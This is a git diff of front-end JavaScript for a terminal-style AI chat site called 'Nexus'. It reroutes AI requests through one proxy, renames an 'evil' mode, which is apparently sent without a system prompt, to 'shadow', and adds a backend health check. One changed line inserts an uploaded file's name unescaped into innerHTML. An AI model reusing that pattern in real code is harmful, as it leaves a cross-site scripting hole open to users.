     if (genMatch) {
-        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
+        
         const isVintage = /^vintage\s/i.test(cmd);
         generateImage(isVintage ? cmd.trim() : genMatch[1].trim());
         return;
@@ -3662,7 +3778,7 @@ function handleCommand(cmd) {
 
     // img2img: transform attached image with a new prompt
     if (imgSnap && (lc.startsWith('transform ') || lc.startsWith('restyle ') || lc.startsWith('remix '))) {
-        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
+        
         const transformPrompt = cmd.slice(cmd.indexOf(' ') + 1).trim();
         pendingImageB64 = null;
         generateImageFromImage(imgSnap, transformPrompt);
@@ -3672,45 +3788,9 @@ function handleCommand(cmd) {
     pendingImageB64 = null;
     logPrompt(cmd, imgSnap);
 
-    printToTerminal(`${pl} ${cmd}`, 'user-cmd');
-
-    // AI Dispatch
-    if (currentMode === 'evil') {
-        console.log(`[AI] Dispatching EVIL...`);
-        askEvil(cmd, imgSnap, null, 'evil-msg');
-    } else {
-        console.log(`[AI] Dispatching ${currentMode.toUpperCase()}...`);
-        showThinking(cmd);
-        
-        if (termWs && termWs.readyState === WebSocket.OPEN) {
-            // Register timeout only IF we are using WS
-            _thinkFallbackCmd = cmd;
-            clearTimeout(_thinkTimeout);
-            _thinkTimeout = setTimeout(() => {
-                if (_thinkFallbackCmd) {
-                    console.warn("[AI] WebSocket timed out. Falling back to Proxy...");
-                    askEvil(cmd, imgSnap, MODE_SYSTEMS[currentMode] || MODE_SYSTEMS.nexus, 'ai-msg');
-                    _thinkFallbackCmd = null;
-                }
-            }, 18000);
-
-            const historySlice = messageHistory.slice(-12).map(m => ({ 
-                role: m.role === 'assistant' || m.role === 'model' || m.role === 'nexus' ? 'assistant' : 'user', 
-                content: m.content 
-            }));
-            const payload = {
-                cmd: cmd,
-                mode: currentMode,
-                history: historySlice,
-                context: '' 
-            };
-            if (imgSnap) payload.imageB64 = imgSnap;
-            termWs.send(JSON.stringify(payload));
-        } else {
-            console.warn("[AI] WebSocket offline. Immediate fallback to Direct API...");
-            askEvil(cmd, imgSnap, MODE_SYSTEMS[currentMode] || MODE_SYSTEMS.nexus, 'ai-msg');
-        }
-    }
+    // AI DISPATCH: Custom Cloudflare Uplink (Master Pacific Link)
+    // Satisfying request: "use that specific thing for everything"
+    prompt_ai_proxy(cmd, imgSnap, currentMode, '');
 }
 
 // =============================================================
@@ -3720,57 +3800,12 @@ function handleCommand(cmd) {
 document.querySelectorAll('.action-btn').forEach(btn => {
     btn.addEventListener('click', () => {
         const cmd = btn.getAttribute('data-cmd');
+        if (!cmd) return;
         const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
         const promptLabel = document.getElementById('prompt-label')?.textContent || (nexusUser?.name ? `${nexusUser.name.toLowerCase()}@nexus:~$` : 'guest@nexus:~$');
-        if (cmd === 'clear history') { 
-            printToTerminal(`${promptLabel} clear history`, 'user-cmd');
-            localStorage.removeItem(HISTORY_KEYS[currentMode]); 
-            messageHistory = []; 
-            printToTerminal(`[SYS] ${currentMode.toUpperCase()} history wiped.`, 'sys-msg');
-            input.focus();
-            return;
-        }
-        if (cmd === 'clear')            { output.innerHTML = ''; messageHistory = []; localStorage.removeItem(HISTORY_KEYS[currentMode]); return; }
-        if (cmd === 'help')             { printToTerminal(`${promptLabel} help`, 'user-cmd'); showHelp(); input.focus(); return; }
-        if (cmd === 'whoami')           { printToTerminal(`${promptLabel} whoami`, 'user-cmd'); runWhoami(); input.focus(); return; }
-        if (cmd === 'neofetch')         { printToTerminal(`${promptLabel} neofetch`, 'user-cmd'); runNeofetch(); input.focus(); return; }
-        if (cmd === 'logs' || cmd === 'log') { printToTerminal(`${promptLabel} logs`, 'user-cmd'); showLogs(); input.focus(); return; }
-        if (cmd === 'play pong')        { startPong(); return; }
-        if (cmd === 'play snake')       { startSnake(); return; }
-        if (cmd === 'play wordle')      { startWordle(); return; }
-        if (cmd === 'play minesweeper') { startMinesweeper(); return; }
-        if (cmd === 'play flappy')      { startFlappy(); return; }
-        if (cmd === 'play breakout')    { startBreakout(); return; }
-        if (cmd === 'play invaders')    { startInvaders(); return; }
-        if (cmd === 'leaderboard')      { printToTerminal(`${promptLabel} leaderboard`, 'user-cmd'); showLeaderboard(); input.focus(); return; }
-        if (cmd === 'type test')        { startTypingTest(); return; }
-        if (cmd === 'matrix')           { startMatrixSaver(); return; }
-        if (cmd === 'monitor')          { startMonitor(); return; }
-
-        printToTerminal(`${promptLabel} ${cmd}`, 'user-cmd');
-
-        if (isCreatorQuestion(cmd)) { showCreatorResponse(); input.focus(); return; }
-        if (isContactQuestion(cmd))  { showContactResponse();  input.focus(); return; }
-
-        // Image generation works in ALL modes
-        const genMatchBtn = cmd.match(/^(?:generate|imagine|draw|create image of|make image of|vintage)\s+(.+)/i);
-        if (genMatchBtn) {
-            const isVintageBtn = /^vintage\s/i.test(cmd);
-            generateImage(isVintageBtn ? cmd.trim() : genMatchBtn[1].trim());
-            input.focus();
-            return;
-        }
-
-        const snap = pendingImageB64;
-        pendingImageB64 = null;
-        logPrompt(cmd, snap);
-
-        const system = MODE_SYSTEMS[currentMode] || MODE_SYSTEMS.nexus;
-        const msgCls = (currentMode === 'evil' ? 'evil-msg' : 'ai-msg');
         
-        console.log(`[AI] Dispatching ${currentMode.toUpperCase()} (via button) through Proxy...`);
-        askEvil(cmd, snap, (currentMode === 'evil' ? null : system), msgCls);
-        
+        // PACIFIC UI: Clean single-print execution
+        handleCommand(cmd);
         input.focus();
     });
 });
@@ -3799,7 +3834,7 @@ function showThinking(cmd) {
     _thinkFallbackCmd = cmd || null;
 
     const col = MODE_COLORS[currentMode] || '#4af';
-    const label = (currentMode === 'evil' ? 'EVIL' : currentMode === 'coder' ? 'CODER' : currentMode === 'sage' ? 'SAGE' : 'NEXUS');
+    const label = (currentMode === 'shadow' ? 'SHADOW' : currentMode === 'coder' ? 'CODER' : currentMode === 'sage' ? 'SAGE' : 'NEXUS');
     const p = document.createElement('p');
     p.id = 'ai-thinking';
     p.style.margin = '6px 0';
@@ -3821,11 +3856,11 @@ function showThinking(cmd) {
         _thinkTimeout = null;
         const fallback = _thinkFallbackCmd;
         _thinkFallbackCmd = null;
-        if (fallback && currentMode !== 'evil') {
-            // WS timed out — retry instantly via CF Worker (no "routing via..." noise)
-            askEvil(fallback, null, MODE_SYSTEMS[currentMode] || MODE_SYSTEMS.nexus, 'ai-msg');
-        } else if (fallback && currentMode === 'evil') {
-            askEvil(fallback, null);
+        if (fallback && currentMode !== 'shadow') {
+            // WS timed out  retry instantly via CF Worker (no "routing via..." noise)
+            askPacific(fallback, null, MODE_SYSTEMS[currentMode] || MODE_SYSTEMS.nexus, 'ai-msg');
+        } else if (fallback && currentMode === 'shadow') {
+            askPacific(fallback, null);
         }
     }, 18000);
 }
@@ -3836,7 +3871,7 @@ function _logAIResponse(responseText) {
     const user = JSON.parse(localStorage.getItem('nexus_user_data') || '{"name":"Guest"}');
     
     const embed = {
-        title: `🤖 Nexus Reply to ${user.name}`,
+        title: ` Nexus Reply to ${user.name}`,
         color: 0xff00ff,
         description: `\`\`\`\n${responseText.slice(0, 1500)}\n\`\`\``,
         timestamp: new Date().toISOString()
@@ -3850,7 +3885,7 @@ function jsonPayload(cmd) {
     const payload = { command: cmd, history: history, mode: currentMode, context: XAVIER_BIO };
     if (pendingImageB64) {
         payload.image = pendingImageB64;
-        pendingImageB64 = null; // consume — sent once
+        pendingImageB64 = null; // consume  sent once
     }
     return JSON.stringify(payload);
 }
@@ -3890,10 +3925,10 @@ function openImageViewer(file) {
         pendingImageB64 = ev.target.result;
         const b64 = pendingImageB64;
 
-        // ── Inline terminal thumbnail ──────────────────────────
+        //  Inline terminal thumbnail 
         const p = document.createElement('p');
         p.className = 'sys-msg';
-        p.innerHTML = `📎 <b style="color:#0ff">${file.name}</b> <span style="color:#444">(${(file.size/1024).toFixed(1)} KB)</span><br>
+        p.innerHTML = ` <b style="color:#0ff">${file.name}</b> <span style="color:#444">(${(file.size/1024).toFixed(1)} KB)</span><br>
             <img src="${b64}"
                  style="max-height:72px;max-width:180px;border:1px solid #0ff;border-radius:3px;margin-top:5px;display:block;cursor:pointer;"
                  title="Click to expand"
@@ -3902,7 +3937,7 @@ function openImageViewer(file) {
         output.appendChild(p);
         output.scrollTop = output.scrollHeight;
 
-        // No GUI popup — stays in chat. Click thumbnail to expand.
+        // No GUI popup  stays in chat. Click thumbnail to expand.
         input.focus();
     };
     reader.readAsDataURL(file);
@@ -3941,7 +3976,7 @@ if (input && quickActions) {
 // =============================================================
 //  INIT
 // =============================================================
-// Restore saved mode (UI only — no message, no flash)
+// Restore saved mode (UI only  no message, no flash)
 if (currentMode !== 'nexus') {
     const m = MODES[currentMode];
     if (m) {
@@ -3966,14 +4001,9 @@ if (_savedHistory.length) {
     messageHistory = _savedHistory;
     setTimeout(() => {
         const col = MODE_COLORS[currentMode] || '#0ff';
-        printToTerminal(`[SYS] ${_savedHistory.length} ${currentMode.toUpperCase()} messages from last session — type <b style="color:${col}">history</b> to view all modes.`, 'sys-msg');
+        printToTerminal(`[SYS] ${_savedHistory.length} ${currentMode.toUpperCase()} messages from last session  type <b style="color:${col}">history</b> to view all modes.`, 'sys-msg');
     }, 2000);
 }
-
-connectWS();
-connectStats();
-updateClientStats();
-setInterval(updateClientStats, 5000);
 
 // =============================================================
 //  ACCESSIBILITY
@@ -4026,7 +4056,7 @@ function toggleSound() {
     _a11ySyncButtons();
 }
 
-// ── Voice selection helpers ──────────────────────────────────────────────────
+//  Voice selection helpers 
 // Preferred voice names in priority order (Google > Microsoft > macOS > default)
 const _VOICE_PREF = [
     'Google US English', 'Google UK English Female', 'Google UK English Male',
@@ -4058,14 +4088,14 @@ function _buildVoiceOptions(sel) {
     }
     const saved = localStorage.getItem('nexus_tts_voice');
     const list  = voices.filter(v => v.lang.startsWith('en'));
-    sel.innerHTML = '<option value="">— Auto (best available) —</option>';
+    sel.innerHTML = '<option value=""> Auto (best available) </option>';
     (list.length ? list : voices).forEach(v => {
         const opt = document.createElement('option');
         opt.value = v.name;
         opt.textContent = `${v.name} (${v.lang})`;
         sel.appendChild(opt);
     });
-    // Set selection using sel.value — simpler and always works
+    // Set selection using sel.value  simpler and always works
     if (saved) {
         sel.value = saved;
         if (!sel.value) { sel.value = ''; localStorage.removeItem('nexus_tts_voice'); }
@@ -4088,7 +4118,6 @@ function toggleA11yPanel() {
     const panel = document.getElementById('a11y-panel');
     if (panel) {
         panel.classList.toggle('a11y-panel-open');
-        // Re-populate voices each open (Chrome loads them async after first gesture)
         if (panel.classList.contains('a11y-panel-open')) {
             const sel = panel.querySelector('#a11y-voice-sel');
             if (sel) _buildVoiceOptions(sel);
@@ -4102,11 +4131,10 @@ function toggleA11yPanel() {
     el.innerHTML = `
         <div class="a11y-panel-header">
             <span>[ ACCESSIBILITY ]</span>
-            <button onclick="document.getElementById('a11y-panel').classList.remove('a11y-panel-open')" class="a11y-close">✕</button>
+            <button onclick="document.getElementById('a11y-panel').classList.remove('a11y-panel-open')" class="a11y-close">X</button>
         </div>
 
         <div class="a11y-section-label">VISUALS</div>
-
         <div class="a11y-row">
             <button class="a11y-toggle" data-class="crt-mode" onclick="toggleA11yClass('crt-mode')">CRT Mode</button>
             <button class="a11y-toggle" id="sound-toggle" onclick="toggleSound()">Sound Effects</button>
@@ -4138,7 +4166,7 @@ function toggleA11yPanel() {
 
         <div class="a11y-section-label">VOICE (speak command)</div>
         <select id="a11y-voice-sel" class="a11y-voice-sel">
-            <option value="">Loading voices…</option>
+            <option value="">Loading voices...</option>
         </select>
 
         <div class="a11y-tip">All settings saved automatically.</div>
@@ -4178,15 +4206,50 @@ window.onload = async () => {
         guiTitle     = document.getElementById('gui-title');
         nexusCanvas  = document.getElementById('nexus-canvas');
 
+        // PRE-BOOT HEALTH CHECK (Vital for Render free tier sleep)
+        let isBackendOnline = false;
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 8000); // Wait 8s for Render wake
+            const pingRes = await fetch(`${API_BASE}/ping`, { signal: controller.signal });
+            clearTimeout(timeoutId);
+            if (pingRes.ok) isBackendOnline = true;
+        } catch (e) {
+            console.warn("[BOOT] Health check failed. Backend may be offline.");
+        }
+
+        if (!isBackendOnline) {
+            const maint = document.createElement('div');
+            maint.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,0.98);color:#f55;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:'Fira Code',monospace;text-align:center;padding:20px;";
+            maint.innerHTML = `
+                <div style="width:12px;height:12px;background:#f55;border-radius:50%;margin-bottom:15px;box-shadow:0 0 10px #f55;animation:pulse 2s infinite;"></div>
+                <h1 style="color:#fff;font-size:1.5rem;letter-spacing:2px;margin:0 0 10px 0;">SYSTEM OFFLINE</h1>
+                <p style="color:#aaa;max-width:400px;line-height:1.6;font-size:0.85rem;">
+                    "This is my creation."<br>
+                    The Nexus Core is currently undergoing maintenance or entering a sleep cycle. Neural uplinks are severed.
+                </p>
+                <button onclick="location.reload()" style="margin-top:20px;background:none;border:1px solid #555;color:#888;padding:8px 16px;cursor:pointer;font-family:monospace;transition:0.2s;">[ INITIATE PING REFRESH ]</button>
+            `;
+            document.body.appendChild(maint);
+            return; // Halt boot sequence entirely
+        }
+
         // Check for existing session on server (handles redirect return)
+        let authedName = null;
         try {
             const meRes = await fetch(`${API_BASE}/api/me`);
             const meData = await meRes.json();
             if (meData.ok) {
                 localStorage.setItem('nexus_user_data', JSON.stringify(meData));
-                revealTerminal(meData.name);
+                authedName = meData.name;
             }
         } catch(e) {}
+
+        // Fallback to local storage if server check failed
+        if (!authedName) {
+            const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
+            if (nexusUser && nexusUser.name) authedName = nexusUser.name;
+        }
 
         // Load history for the current mode on boot
         messageHistory = loadHistory(currentMode);
@@ -4194,9 +4257,8 @@ window.onload = async () => {
         // Start auth in background (non-blocking)
         initGoogleAuth();
 
-        const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
-        if (nexusUser && nexusUser.name) {
-            revealTerminal(nexusUser.name);
+        if (authedName) {
+            revealTerminal(authedName);
         } else {
             console.log("[NEXUS] Awaiting Authorization...");
         }
